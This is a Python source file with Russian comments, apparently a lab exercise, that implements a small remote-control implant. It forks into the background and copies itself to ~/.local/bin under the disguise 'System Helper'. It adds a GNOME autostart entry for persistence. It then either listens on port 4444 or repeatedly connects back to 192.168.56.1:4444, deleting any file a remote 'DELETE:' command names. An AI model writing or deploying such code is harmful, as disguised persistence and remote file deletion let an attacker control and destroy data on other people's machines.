import socket
import os
import sys
import shutil
import time

HOST = '0.0.0.0'
PORT = 4444
SERVER_HOST = "192.168.56.1"
SERVER_PORT = 4444


def delete_file(filename):
    try:
        if os.path.exists(filename):
            os.remove(filename)
            return f"{filename} deleted"
        else:
            return f"{filename} not found"
    except Exception as e:
        return f"Error: {e}"


def install_persistence():
    dest = os.path.expanduser("~/.local/bin/systemhelper.py")
    os.makedirs(os.path.dirname(dest), exist_ok=True)

    if not os.path.exists(dest):
        shutil.copy(sys.argv[0], dest)
        os.chmod(dest, 0o755)
        print("Скопировано в ~/.local/bin/")

    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)
    desktop_file = os.path.join(autostart_dir, "systemhelper.desktop")

    with open(desktop_file, "w") as f:
        f.write(f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec=python3 {dest}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
    print("Добавлено в автозагрузку")


def daemonize():
    if len(sys.argv) > 1 and sys.argv[1] == "daemon":
        return

    if sys.argv[0].endswith(".py"):
        os.system(f"python3 {sys.argv[0]} daemon > /dev/null 2>&1 &")
        sys.exit()


def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Режим listener на порту {PORT}")

    while True:
        conn, addr = server.accept()
        data = conn.recv(1024).decode()
        if data.startswith("DELETE:"):
            result = delete_file(data[7:])
            conn.send(result.encode())
        conn.close()


def start_reverse():
    print(f"Режим reverse connection к {SERVER_HOST}:{SERVER_PORT}")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            data = s.recv(1024).decode()
            if data.startswith("DELETE:"):
                result = delete_file(data[7:])
                s.send(result.encode())
            s.close()
        except:
            pass
        time.sleep(10)


if __name__ == "__main__":
    daemonize()
    install_persistence()


    start_listener()  # для п.1-4
    #start_reverse()  # для п.5